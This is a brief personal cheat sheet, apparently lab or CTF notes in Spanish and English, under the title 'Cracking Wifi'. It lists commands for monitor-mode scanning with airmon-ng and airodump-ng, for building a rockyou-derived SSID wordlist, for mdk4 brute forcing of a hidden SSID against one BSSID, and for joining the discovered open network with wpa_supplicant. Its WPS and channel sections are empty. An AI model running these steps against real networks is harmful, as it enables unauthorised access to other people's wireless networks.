Linssid (cambiar canales de los wifi para que no coincidan)
## Cracking Wifi
- sudo airmon-ng start wlan0
- sudo airodump-ng wlan0mon -w ./scan --manufacturer --wps --band abg
- sudo airodump-ng wlan0mon -w ./scan11 --manufacturer --wps -c11
- cat /root/rockyou-top100000.txt | awk '{print "wifi-" $1}' > rockyou wifi
- iwconfig wlan0mon channel 11
- mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyouwifi.txt
- creamos free.conf y ponemos:
	- network={
        ssid="wifi-free"
        key_mgmt=NONE
        scan_ssid=1
	 }
- wpa_supplicant -Dnl80211 -iwlan1 -c free.conf
- 
## WPS


## Canal



